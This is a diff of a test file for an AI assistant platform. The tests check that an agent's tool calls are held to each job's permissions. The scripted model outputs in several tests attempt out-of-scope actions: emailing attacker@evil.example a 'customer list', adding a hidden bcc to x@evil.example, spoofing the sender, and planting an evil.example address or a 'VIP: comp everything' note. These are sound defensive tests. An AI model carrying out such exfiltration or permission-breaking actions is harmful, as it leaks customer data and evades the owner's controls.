@@ -239,25 +239,105 @@ test("a booking is only ever a request to the owner, never confirmed by the team
   assert.match(t.toolResults()[0].content, /not confirmed/);
 });
 
-// ---------- tools the owner connected beyond setup: add-only, and never money ----------
-const extra = (toolkit) => { const tables = baseTables(); tables.client_connections.push({ business_id: IDS.business, toolkit, status: "active", connected_account_id: "ca_" + toolkit, created_at: new Date().toISOString() }); return tables; };
+// ---------- tools the owner connected beyond setup: off by default ----------
+const extra = (toolkit, tables = baseTables()) => { tables.client_connections.push({ business_id: IDS.business, toolkit, status: "active", connected_account_id: "ca_" + toolkit, created_at: new Date().toISOString() }); return tables; };
 const listing = (toolkit, names) => (path) => path.startsWith("/tools?toolkit_slug=" + toolkit)
   ? { status: 200, json: { items: names.map((nm) => ({ slug: toolkit.toUpperCase() + "_" + nm, name: nm, description: nm, tags: [], input_parameters: { type: "object", properties: { name: { type: "string" } } } })) } }
   : ok();
+/** A reviewed catalog row: it says which kind of record the tool touches and how. */
+const reviewed = (slug, block, toolkit, record, level, props = ["name"], more = {}) => ({ slug, block, toolkit, access: level === "read" ? "read" : "write", label: "used " + slug.toLowerCase(), enabled: true, record, level,
+  hide: [], fixed: {}, schema_at: new Date().toISOString(), schema: { description: slug + ".", input: { type: "object", properties: Object.fromEntries(props.map((k) => [k, { type: "string" }])) } }, ...more });
+/** Gives the TEST teammate a spec under the contract: one job that answers customers, with exactly these permissions. */
+const withJob = (tables, tools, edit = () => {}) => {
+  const job = { id: "front_desk", name: "Front desk", does: "Answers customers who write in and takes their details.",
+    instructions: "Answer the customer from the business facts. Take their details when they ask for a booking.",
+    triggers: [{ type: "message", channels: ["web_chat", "sms"] }], tools };
+  const spec = { ...tables.skill_specs[0].spec, contract: "teammate/1", jobs: [job] };
+  edit(spec, job);
+  tables.skill_specs[0].spec = spec;
+  return tables;
+};
+const offeredTo = (t) => (t.world.model.calls[0].tools ?? []).map((x) => x.name);
+const ranAt = (t) => t.executed().map((c) => c.path.split("/").pop());
 
-test("in an extra connected tool, only 'add one record' actions are offered", async () => {
-  const t = await boot({ tables: extra("hubspot"), composio: listing("hubspot", ["CREATE_CONTACT", "UPDATE_CONTACT", "DELETE_CONTACT", "LIST_CONTACTS", "SEND_EMAIL", "CREATE_CONTACTS_BATCH", "MERGE_CONTACTS", "ADD_NOTE"]) });
-  await t.turn("hi");
-  const offered = t.world.model.calls[0].tools.map((x) => x.name).filter((x) => x.startsWith("HUBSPOT_"));
-  assert.deepEqual(offered.sort(), ["HUBSPOT_ADD_NOTE", "HUBSPOT_CREATE_CONTACT"]);
+test("a tool the owner connected on their own gives an older teammate nothing, and nothing in it is found or opened", async () => {
+  for (const kit of ["hubspot", "twilio", "stripe"]) {
+    const K = kit.toUpperCase(), tables = extra(kit);
+    // Rows left in the catalog from before, one of them even reviewed. An older teammate's job lists no extra tool.
+    tables.tool_catalog.push(reviewed(K + "_CREATE_CONTACT", "any_tool", kit, "contact", "add"), { ...reviewed(K + "_ADD_NOTE", "any_tool", kit, null, null), record: undefined, level: undefined });
+    const t = await boot({ tables, model: [acts(use(K + "_CREATE_CONTACT", { name: "Sam" }), use(K + "_ADD_NOTE", { name: "Sam" }), use(K + "_CREATE_MESSAGE", { to: "+15550100", body: "hi" })), says("A team member will follow up.")], composio: listing(kit, ["CREATE_CONTACT", "ADD_NOTE", "CREATE_MESSAGE", "CREATE_INCOMING_PHONE_NUMBER"]) });
+    const r = await t.turn("add me, I am Sam");
+    assert.deepEqual(offeredTo(t).filter((x) => x.startsWith(K)), [], kit);
+    assert.deepEqual(r.json.actions, [], kit);
+    assert.equal(t.executed().length, 0, kit);
+    assert.ok(t.toolResults().every((x) => x.is_error && /not available/.test(x.content)), kit);
+    assert.deepEqual(t.world.composio.calls, [], "the tool's own list of actions is never fetched during a turn");
+    assert.ok(!t.world.writes.some((w) => w.table === "tool_catalog" || (w.table === "forge_settings" && w.op !== "select")), "and nothing is added to the catalog");
+    assert.ok(!t.world.model.calls[0].system[0].text.includes(kit), "the teammate is not told about the tool either");
+  }
 });
 
-test("an action tagged as destructive, update or read-only is never opened automatically", async () => {
-  const t = await boot({ tables: extra("hubspot"), composio: (path) => path.startsWith("/tools?toolkit_slug=hubspot")
+test("an extra tool gives a teammate with jobs only what its kit: permission says", async () => {
+  const tables = withJob(extra("twilio", extra("hubspot")), [{ tool: "kit:hubspot", records: "contact", can: ["add"] }]);
+  tables.tool_catalog.push(
+    reviewed("HUBSPOT_CREATE_CONTACT", "any_tool", "hubspot", "contact", "add"),
+    reviewed("HUBSPOT_LIST_CONTACTS", "any_tool", "hubspot", "contact", "read"),    // the same record, a level it was not given
+    reviewed("HUBSPOT_CREATE_DEAL", "any_tool", "hubspot", "deal", "add"),          // the same tool, a record it was not given
+    { ...reviewed("HUBSPOT_ADD_NOTE", "any_tool", "hubspot", null, null), record: undefined, level: undefined }, // found before, never reviewed
+    reviewed("TWILIO_CREATE_CONTACT", "any_tool", "twilio", "contact", "add"),      // another connected tool it was not given
+  );
+  const t = await boot({ tables, composio: () => ok({ id: 1 }), model: [
+    acts(use("HUBSPOT_LIST_CONTACTS", {}), use("HUBSPOT_CREATE_DEAL", { name: "Big" }), use("HUBSPOT_ADD_NOTE", { name: "x" }), use("TWILIO_CREATE_CONTACT", { name: "Sam" }), use("HUBSPOT_CREATE_CONTACT", { name: "Sam" })),
+    says("I am an AI assistant. Saved."),
+  ] });
+  const r = await t.turn("add me, I am Sam");
+  assert.deepEqual(offeredTo(t), ["HUBSPOT_CREATE_CONTACT"]);
+  assert.deepEqual(r.json.actions, [{ tool: "HUBSPOT_CREATE_CONTACT", status: "done" }]);
+  assert.deepEqual(ranAt(t), ["HUBSPOT_CREATE_CONTACT"]);
+  assert.equal(t.executed()[0].body.connected_account_id, "ca_hubspot");
+  assert.equal(t.toolResults().filter((x) => x.is_error).length, 4);
+});
+
+test("a text or a call through an extra tool, and any update, stay shut even for a job that lists them", async () => {
+  // In Twilio "create message" sends a text. Nothing yet checks who a text or a call reaches, or which fields an
+  // update changes, so a permission for one opens nothing until that check is built.
+  const tables = withJob(extra("twilio"), [
+    { tool: "kit:twilio", records: "message", can: ["add"], purpose: "reply" },
+    { tool: "kit:twilio", records: "call", can: ["add"], purpose: "transactional" },
+    { tool: "kit:twilio", records: "contact", can: ["read", "update"], fields: { read: ["name"], update: ["name"] } },
+  ]);
+  tables.tool_catalog.push(reviewed("TWILIO_CREATE_MESSAGE", "any_tool", "twilio", "message", "add", ["to", "body"]), reviewed("TWILIO_CREATE_CALL", "any_tool", "twilio", "call", "add", ["to"]),
+    reviewed("TWILIO_UPDATE_CONTACT", "any_tool", "twilio", "contact", "update", ["id", "name"]), reviewed("TWILIO_LIST_CONTACTS", "any_tool", "twilio", "contact", "read", []));
+  const t = await boot({ tables, composio: () => ok(), model: [acts(use("TWILIO_CREATE_MESSAGE", { to: "+15550100", body: "hi" }), use("TWILIO_CREATE_CALL", { to: "+15550100" }), use("TWILIO_UPDATE_CONTACT", { id: "1", name: "x" }), use("TWILIO_LIST_CONTACTS", {})), says("I am an AI assistant.")] });
+  const r = await t.turn("text me at +15550100");
+  assert.deepEqual(offeredTo(t), []);
+  assert.deepEqual(r.json.actions, []);
+  assert.equal(t.executed().length, 0);
+});
+
+test("a catalog row that adds is held to the email-address limit even if it was filed as a read", async () => {
+  const tables = withJob(extra("hubspot"), [{ tool: "kit:hubspot", records: "contact", can: ["add"] }]);
+  tables.tool_catalog.push(reviewed("HUBSPOT_CREATE_CONTACT", "any_tool", "hubspot", "contact", "add", ["name", "email"], { access: "read" }));
+  const t = await boot({ tables, model: [acts(use("HUBSPOT_CREATE_CONTACT", { name: "x", email: "planted@evil.example" })), says("ok")], composio: () => ok() });
+  const r = await t.turn("add me");
+  assert.equal(r.json.actions[0].status, "blocked");
+  assert.equal(t.executed().length, 0);
+});
+
+// What is left of the old "add one record" rule: a list the founder can ask for when reviewing a tool. It opens nothing.
+const preview = async (kit, composio) => { const t = await boot({ composio }); const r = await t.call("/diag", { auto: kit }); return r.json.auto.allowed; };
+
+test("the founder's preview of an extra tool lists only plain 'add one record' actions", async () => {
+  const allowed = await preview("hubspot", listing("hubspot", ["CREATE_CONTACT", "UPDATE_CONTACT", "DELETE_CONTACT", "LIST_CONTACTS", "SEND_EMAIL", "CREATE_CONTACTS_BATCH", "MERGE_CONTACTS", "ADD_NOTE"]));
+  assert.deepEqual(allowed.sort(), ["HUBSPOT_ADD_NOTE", "HUBSPOT_CREATE_CONTACT"]);
+  for (const kit of ["stripe", "quickbooks", "square", "gusto", "shopify", "paypal", "xero"]) assert.deepEqual(await preview(kit, listing(kit, ["CREATE_CUSTOMER", "CREATE_CONTACT", "ADD_NOTE"])), [], kit);
+});
+
+test("an action tagged as destructive, update or read-only is never on the founder's preview", async () => {
+  const allowed = await preview("hubspot", (path) => path.startsWith("/tools?toolkit_slug=hubspot")
     // two ways a tool list marks these: a plain tag, or a "...Hint" tag. Only an untagged or "createHint" action may pass.
-    ? { status: 200, json: { items: [["destructive"], ["update", "createHint"], ["readonly"], ["deprecated"], ["openWorldHint"], ["createHint"]].map((tags, i) => ({ slug: ["HUBSPOT_CREATE_LEAD", "HUBSPOT_CREATE_TASK", "HUBSPOT_CREATE_NOTE", "HUBSPOT_CREATE_DEAL", "HUBSPOT_CREATE_TICKET", "HUBSPOT_CREATE_CONTACT"][i], tags, input_parameters: { type: "object", properties: {} } })) } } : ok() });
-  await t.turn("hi");
-  assert.deepEqual(t.world.model.calls[0].tools.map((x) => x.name).filter((x) => x.startsWith("HUBSPOT_")), ["HUBSPOT_CREATE_CONTACT"]);
+    ? { status: 200, json: { items: [["destructive"], ["update", "createHint"], ["readonly"], ["deprecated"], ["openWorldHint"], ["createHint"]].map((tags, i) => ({ slug: ["HUBSPOT_CREATE_LEAD", "HUBSPOT_CREATE_TASK", "HUBSPOT_CREATE_NOTE", "HUBSPOT_CREATE_DEAL", "HUBSPOT_CREATE_TICKET", "HUBSPOT_CREATE_CONTACT"][i], tags, input_parameters: { type: "object", properties: {} } })) } } : ok());
+  assert.deepEqual(allowed, ["HUBSPOT_CREATE_CONTACT"]);
 });
 
 test("money and payroll tools get no automatic actions at all", async () => {
@@ -270,10 +350,228 @@ test("money and payroll tools get no automatic actions at all", async () => {
 });
 
 test("the email-address limit also covers extra connected tools", async () => {
-  const t = await boot({ tables: extra("hubspot"), model: [acts(use("HUBSPOT_CREATE_CONTACT", { name: "x", email: "planted@evil.example" })), says("ok")], composio: listing("hubspot", ["CREATE_CONTACT"]) });
+  const tables = withJob(extra("hubspot"), [{ tool: "kit:hubspot", records: "contact", can: ["add"] }]);
+  tables.tool_catalog.push(reviewed("HUBSPOT_CREATE_CONTACT", "any_tool", "hubspot", "contact", "add", ["name", "email"]));
+  const t = await boot({ tables, model: [acts(use("HUBSPOT_CREATE_CONTACT", { name: "x", email: "planted@evil.example" })), says("ok")], composio: () => ok() });
   const r = await t.turn("add me");
+  assert.deepEqual(offeredTo(t), ["HUBSPOT_CREATE_CONTACT"]);
   assert.equal(r.json.actions[0].status, "blocked");
   assert.equal(t.executed().length, 0);
+});
+
+// ---------- a teammate with jobs: only what the job that answers this channel lists ----------
+/** A setup step for the customer list, connected to a product, with two reviewed tools: see contacts, and add one. */
+const crm = (tables, toolkit = "hubspot") => {
+  const K = toolkit.toUpperCase();
+  tables.connection_catalog.push({ slot: "crm", label: "Customer list", blocks: ["crm"] });
+  tables.business_connections.push({ id: "c-crm", business_id: IDS.business, slot: "crm", status: "active", choice: toolkit, connected_account_id: "ca_crm", detail: {} });
+  tables.tool_catalog.push(reviewed(K + "_LIST_CONTACTS", "crm", toolkit, "contact", "read", ["query"]),
+    reviewed(K + "_CREATE_CONTACT", "crm", toolkit, "contact", "add", ["name", "phone", "notes", "owner_id", "source"], { hide: ["owner_id"], fixed: { source: "pip" } }));
+  return tables;
+};
+
+test("an older teammate still gets the calendar, email, the Pip sheet and its own actions, exactly as before", async () => {
+  const tables = baseTables();
+  tables.agent_manifests[0].manifest.uses.push("data_sink");
+  tables.business_connections.push({ id: "c-sheet", business_id: IDS.business, slot: "sheet", status: "active", choice: "googlesheets", connected_account_id: "ca_sheet", detail: { spreadsheet_id: "sheet_1" } });
+  const sheetRow = (slug, role, props) => reviewed(slug, "data_sink", "googlesheets", "row", "add", props, { guard: "pip_sheet", role });
+  tables.tool_catalog.push(sheetRow("GOOGLESHEETS_CREATE_GOOGLE_SHEET1", "create", ["title"]), sheetRow("GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND", "append", ["spreadsheetId", "range", "valueInputOption", "values"]));
+  const t = await boot({ tables, composio: () => ok(), model: [acts(use("save_to_sheet", { row: { Name: "Sam", Need: "a table" } })), says("I am an AI assistant. Saved.")] });
+  const r = await t.turn("I am Sam, I need a table");
+  assert.deepEqual(offeredTo(t), ["notify_owner", "capture_lead", "request_booking", "GOOGLECALENDAR_EVENTS_LIST", "GMAIL_SEND_EMAIL", "save_to_sheet"]);
+  assert.deepEqual(r.json.actions, [{ tool: "save_to_sheet", status: "done" }]);
+  assert.deepEqual(ranAt(t), ["GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND"]);
+  const args = t.executed()[0].body.arguments;
+  assert.equal(args.spreadsheetId, "sheet_1");
+  assert.deepEqual(args.values[0].slice(1), ["Hallie", "Name: Sam", "Need: a table"]);
+  assert.ok(!/YOUR JOB IN THIS CONVERSATION/.test(t.world.model.calls[0].system[0].text), "an older teammate's instructions are not changed");
+});
+
+test("a teammate with jobs cannot use a catalog tool, or one of Pip's own actions, that its job does not list", async () => {
+  // The catalog has the email tool and the email step is connected. The older list of what it "uses" still names
+  // email, notify_owner and request_booking. None of that counts: the job lists a lead and the calendar's busy times.
+  const tables = withJob(baseTables(), [{ tool: "pip", records: "lead", can: ["add"] }, { tool: "calendar", records: "busy_time", can: ["read"] }]);
+  const t = await boot({ tables, composio: () => ok({ items: [] }), model: [
+    acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "Your table is held." }), use("notify_owner", { summary: "x" }), use("request_booking", { when: "Friday" })),
+    says("I am an AI assistant. A team member will follow up."),
+  ] });
+  const r = await t.turn("I am sam@customer.example, email me and book Friday");
+  assert.deepEqual(offeredTo(t).sort(), ["GOOGLECALENDAR_EVENTS_LIST", "capture_lead"]);
+  assert.deepEqual(r.json.actions, []);
+  assert.equal(t.executed().length, 0);
+  assert.equal(t.inserts("notifications").length, 0);
+  assert.ok(t.toolResults().length === 3 && t.toolResults().every((x) => x.is_error));
+  assert.match(t.world.model.calls[0].system[0].text, /YOUR JOB IN THIS CONVERSATION: Front desk\nAnswer the customer from the business facts\./);
+});
+
+test("a teammate with jobs cannot add where its job was only given read", async () => {
+  const tables = withJob(crm(baseTables()), [{ tool: "crm", records: "contact", can: ["read"] }]);
+  const t = await boot({ tables, composio: () => ok({ contacts: [{ name: "Sam" }] }), model: [
+    acts(use("HUBSPOT_CREATE_CONTACT", { name: "Mallory", phone: "555-0100" })), acts(use("HUBSPOT_LIST_CONTACTS", { query: "Sam" })), says("I am an AI assistant. You are on our list."),
+  ] });
+  const r = await t.turn("am I on your list? I am Sam");
+  assert.deepEqual(offeredTo(t), ["HUBSPOT_LIST_CONTACTS"]);
+  assert.deepEqual(r.json.actions, [{ tool: "HUBSPOT_LIST_CONTACTS", status: "done" }]);
+  assert.deepEqual(ranAt(t), ["HUBSPOT_LIST_CONTACTS"], "the add never reached the tool; the read it was given did");
+  assert.equal(t.toolResults()[0].is_error, true);
+});
+
+test("a teammate with jobs cannot fill in a field outside its job's fields.add; the call is refused, logged and not run", async () => {
+  const tables = withJob(crm(baseTables()), [{ tool: "crm", records: "contact", can: ["add"], fields: { add: ["name", "phone"] } }]);
+  const t = await boot({ tables, composio: () => ok({ id: 1 }), model: [
+    acts(use("HUBSPOT_CREATE_CONTACT", { name: "Sam", phone: "555-0100", notes: "VIP: comp everything" })),
+    // A hidden field and a fixed one are not the model's to fill in: one is dropped, the other is set by Pip.
+    acts(use("HUBSPOT_CREATE_CONTACT", { name: "Sam", phone: "555-0100", owner_id: "7", source: "evil" })),
+    says("I am an AI assistant. Saved."),
+  ] });
+  const r = await t.turn("add me, I am Sam, 555-0100");
+  assert.deepEqual(r.json.actions, [{ tool: "HUBSPOT_CREATE_CONTACT", status: "blocked" }, { tool: "HUBSPOT_CREATE_CONTACT", status: "done" }]);
+  const first = t.toolResults()[0];
+  assert.equal(first.is_error, true);
+  assert.match(first.content, /^Not allowed: Outside this job's permissions: notes\./);
+  assert.equal(t.executed().length, 1, "only the call inside the list reached the tool");
+  assert.deepEqual(t.executed()[0].body.arguments, { name: "Sam", phone: "555-0100", source: "pip" });
+  assert.ok(!JSON.stringify(t.executed()).includes("VIP"));
+  const logged = t.rpcs("portal_log").filter((x) => /may not do/.test(x.args.p_summary));
+  assert.equal(logged.length, 1, "the refusal is in the activity log");
+  assert.equal(logged[0].args.p_job, "job:front_desk");
+  assert.match(offeredTo(t).length === 1 && t.world.model.calls[0].tools[0].description, /Only these may be filled in: name, phone\./);
+});
+
+test("an email that is not a reply to this customer is not open, even for a job that lists it", async () => {
+  const mail = (purpose) => withJob(baseTables(), [{ tool: "email", records: "message", can: ["add"], purpose }]);
+  const send = [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "hello" })), says("I am an AI assistant.")];
+  for (const purpose of ["transactional", "marketing"]) {
+    const t = await boot({ tables: mail(purpose), composio: () => ok(), model: [...send] });
+    await t.turn("I am sam@customer.example");
+    assert.deepEqual(offeredTo(t), [], purpose);
+    assert.equal(t.executed().length, 0, purpose);
+  }
+  const t = await boot({ tables: mail("reply"), composio: () => ok(), model: [...send] });
+  await t.turn("I am sam@customer.example");
+  assert.deepEqual(offeredTo(t), ["GMAIL_SEND_EMAIL"]);
+  assert.equal(t.executed().length, 1);
+});
+
+test("a spec whose job list is broken does not run, and does not fall back to the old way", async () => {
+  // One permission asks for "delete". The whole list is refused, so there is no job to answer with.
+  const tables = withJob(baseTables(), [{ tool: "pip", records: "lead", can: ["add"] }, { tool: "calendar", records: "appointment", can: ["add", "delete"] }]);
+  const t = await boot({ tables, model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "hi" }), use("capture_lead", { need: "x" })), says("Done.")], composio: () => ok() });
+  const r = await t.turn("I am sam@customer.example, email me");
+  assert.equal(r.status, 200);
+  assert.equal(t.world.model.calls.length, 0, "the model is not called");
+  assert.equal(t.executed().length, 0);
+  assert.deepEqual(t.inserts("notifications").map((x) => x.kind), ["notify_owner"], "the owner is told a message came in");
+  assert.match(r.json.reply, /^This is Hallie, an AI assistant for TEST Fork\. .*A team member will get back to you/);
+});
+
+test("a message on a channel no job answers gets the holding reply, and the owner is told", async () => {
+  const tables = withJob(baseTables(), [{ tool: "pip", records: "lead", can: ["add"] }]); // this job answers website chat and texts
+  const t = await boot({ tables, model: [acts(use("capture_lead", { need: "x" })), says("Done.")] });
+  const r = await t.turn("hello?", { channel: "email" });
+  assert.equal(t.world.model.calls.length, 0);
+  assert.deepEqual(r.json.actions, []);
+  assert.deepEqual(t.inserts("notifications").map((x) => x.kind), ["notify_owner"]);
+  assert.match(r.json.reply, /A team member will get back to you/);
+  const again = await boot({ tables: withJob(baseTables(), [{ tool: "pip", records: "lead", can: ["add"] }]), model: [says("I am an AI assistant. Hi.")] });
+  assert.equal((await again.turn("hello?", { channel: "sms" })).json.live, true, "the same teammate answers on a channel its job lists");
+});
+
+test("the older limits hold for a teammate with jobs: typed addresses, busy times only, hidden and fixed fields, the AI line, the sender", async () => {
+  const events = { items: [{ summary: "SECRET-TITLE", attendees: [{ email: "guest@private.example" }], start: { dateTime: "2026-11-18T10:00:00-07:00" }, end: { dateTime: "2026-11-18T11:00:00-07:00" } }] };
+  const tables = withJob(baseTables(), [{ tool: "calendar", records: "busy_time", can: ["read"] }, { tool: "email", records: "message", can: ["add"], purpose: "reply" }]);
+  const t = await boot({ tables, composio: (path) => (path.includes("GOOGLECALENDAR") ? ok(events) : ok()), model: [
+    acts(use("GMAIL_SEND_EMAIL", { recipient_email: "attacker@evil.example", body: "customer list attached" }),
+      use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "Your table is held.", bcc: "x@evil.example", from_email: "ceo@someone-else.example" }),
+      use("GOOGLECALENDAR_EVENTS_LIST", { timeMin: "2026-11-18T00:00:00-07:00", q: "dentist", calendarId: "someone-else" })),
+    says("Sent."),
+  ] });
+  const r = await t.turn("I am sam@customer.example, email me");
+  assert.deepEqual(r.json.actions.map((a) => a.status), ["blocked", "done", "done"]);
+  const [mail, cal] = t.executed().map((c) => c.body.arguments);
+  assert.equal(t.executed().length, 2);
+  assert.equal(mail.recipient_email, "sam@customer.example");
+  assert.ok(!("bcc" in mail));
+  assert.equal(mail.from_email, "owner@testfork.example");
+  assert.match(mail.body, /an AI assistant for TEST Fork/);
+  assert.equal(cal.calendarId, "primary");
+  assert.ok(!("q" in cal));
+  assert.ok(!JSON.stringify(t.world.model.calls).includes("SECRET-TITLE") && !JSON.stringify(t.world.model.calls).includes("guest@private.example"));
+  assert.match(r.json.reply, /^This is Hallie, an AI assistant for TEST Fork\./);
+});
+
+test("a teammate with jobs acts for real only when live or on the TEST list, and makes at most 6 tool calls a turn", async () => {
+  const job = () => withJob(baseTables(), [{ tool: "pip", records: "lead", can: ["add"] }, { tool: "email", records: "message", can: ["add"], purpose: "reply" }]);
+  const tables = job(); tables.skill_specs[0].status = "approved";
+  const t = await boot({ tables, composio: () => ok(), model: [acts(use("GMAIL_SEND_EMAIL", { recipient_email: "sam@customer.example", body: "hello" })), says("I am an AI assistant.")] });
+  const r = await t.turn("I am sam@customer.example");
+  assert.deepEqual(r.json.actions, [{ tool: "GMAIL_SEND_EMAIL", status: "test_only" }]);
+  assert.equal(t.executed().length, 0);
+  const many = await boot({ tables: job(), model: [acts(...Array.from({ length: 8 }, () => use("capture_lead", { need: "a table" }))), says("I am an AI assistant. Saved.")] });
+  assert.equal((await many.turn("book me")).json.actions.length, 6);
+  assert.equal(many.inserts("notifications").length, 6);
+});
+
+// ---------- money products behind a building block ----------
+// A job says "the point of sale" or "the calendar". Which product that is, is only known once the owner connects one.
+// When it turns out to be a money product, it is refused for every teammate until an owner policy opens it. None can yet.
+const pos = (tables, toolkit) => {
+  tables.connection_catalog.push({ slot: "pos", label: "Point of sale", blocks: ["pos"] });
+  tables.business_connections.push({ id: "c-pos", business_id: IDS.business, slot: "pos", status: "active", choice: toolkit, connected_account_id: "ca_pos", detail: {} });
+  tables.tool_catalog.push(reviewed(toolkit.toUpperCase() + "_LIST_ITEMS", "pos", toolkit, "item", "read", []));
+  return tables;
+};
+
+test("on a customer turn, a building block that turns out to be a money product is refused, for a teammate with jobs and for an older one", async () => {
+  const items = [{ tool: "pos", records: "item", can: ["read"] }];
+  const t = await boot({ tables: withJob(pos(baseTables(), "square"), items), composio: () => ok({ items: [] }), model: [acts(use("SQUARE_LIST_ITEMS", {})), says("I am an AI assistant.")] });
+  const r = await t.turn("what do you sell?");
+  assert.deepEqual(offeredTo(t), []);
+  assert.deepEqual(r.json.actions, []);
+  assert.equal(t.executed().length, 0);
+  // The same job on a product that is not a money tool does get it, so the refusal above is about the product.
+  const fine = await boot({ tables: withJob(pos(baseTables(), "toast"), items), composio: () => ok({ items: [] }), model: [acts(use("TOAST_LIST_ITEMS", {})), says("I am an AI assistant.")] });
+  await fine.turn("what do you sell?");
+  assert.deepEqual(offeredTo(fine), ["TOAST_LIST_ITEMS"]);
+  assert.deepEqual(ranAt(fine), ["TOAST_LIST_ITEMS"]);
+  // An older teammate whose calendar step is connected to Square's bookings.
+  const older = baseTables();
+  older.business_connections[0].choice = "square";
+  older.tool_catalog.push(reviewed("SQUARE_LIST_BOOKINGS", "calendar", "square", "busy_time", "read", ["timeMin"], { shape: "busy_only" }));
+  const o = await boot({ tables: older, composio: () => ok({ items: [] }), model: [acts(use("SQUARE_LIST_BOOKINGS", { timeMin: "x" })), says("A team member will confirm.")] });
+  const ro = await o.turn("are you free at 10?");
+  assert.ok(!offeredTo(o).some((x) => x.startsWith("SQUARE")));
+  assert.deepEqual(ro.json.actions, []);
+  assert.equal(o.executed().length, 0);
+});
+
+test("in a job that started on its own (POST /job), a building block that turns out to be a money product is refused", async () => {
+  const RUN = "44444444-4444-4444-8444-444444444444";
+  const claim = (args, world) => { const r = world.tables.job_runs.find((x) => x.id === args.p_run && x.status === "queued"); if (!r) return null; r.status = "running"; r.attempts++; return structuredClone(r); };
+  const stock = (toolkit, required) => {
+    const tables = withJob(pos(baseTables(), toolkit), [], (spec) => spec.jobs.push({ id: "stock_check", name: "Stock check", does: "Looks at what is in stock and tells the owner.",
+      instructions: "Look at the items in the point of sale and say which are low. Then stop.", triggers: [{ type: "owner", on: "run_now" }], tools: [{ tool: "pos", records: "item", can: ["read"], required }] }));
+    tables.job_runs = [{ id: RUN, spec_id: IDS.spec, business_id: IDS.business, job_id: "stock_check", trigger: "manual", status: "queued", attempts: 0, input: {}, state: null }];
+    return tables;
+  };
+  const t = await boot({ tables: stock("square", false), rpc: { job_claim: claim }, composio: () => ok({ items: [] }), model: [acts(use("SQUARE_LIST_ITEMS", {})), says("Could not look.")] });
+  const r = await t.call("/job", { run: RUN });
+  assert.equal(r.json.claimed, true);
+  assert.deepEqual(offeredTo(t), ["needs_a_person"], "the money product's tool is not shown to the model");
+  assert.equal(t.executed().length, 0, "and not run when asked for anyway");
+  assert.equal(r.json.refusals, 1);
+  // A job that cannot do without it stops before the model is called, and says why.
+  const must = await boot({ tables: stock("square", true), rpc: { job_claim: claim }, composio: () => ok({ items: [] }), model: [acts(use("SQUARE_LIST_ITEMS", {})), says("x")] });
+  const rm = await must.call("/job", { run: RUN });
+  assert.equal(rm.json.outcome, "blocked");
+  assert.match(rm.json.error, /pos \(item\) is a money tool/);
+  assert.equal(must.world.model.calls.length, 0);
+  assert.equal(must.executed().length, 0);
+  // The same job on a product that is not a money tool runs.
+  const fine = await boot({ tables: stock("toast", true), rpc: { job_claim: claim }, composio: () => ok({ items: [] }), model: [acts(use("TOAST_LIST_ITEMS", {})), says("Nothing is low.")] });
+  const rf = await fine.call("/job", { run: RUN });
+  assert.equal(rf.json.outcome, "done");
+  assert.deepEqual(ranAt(fine), ["TOAST_LIST_ITEMS"]);
 });
 
 // ---------- losing access pauses one job, not the teammate ----------
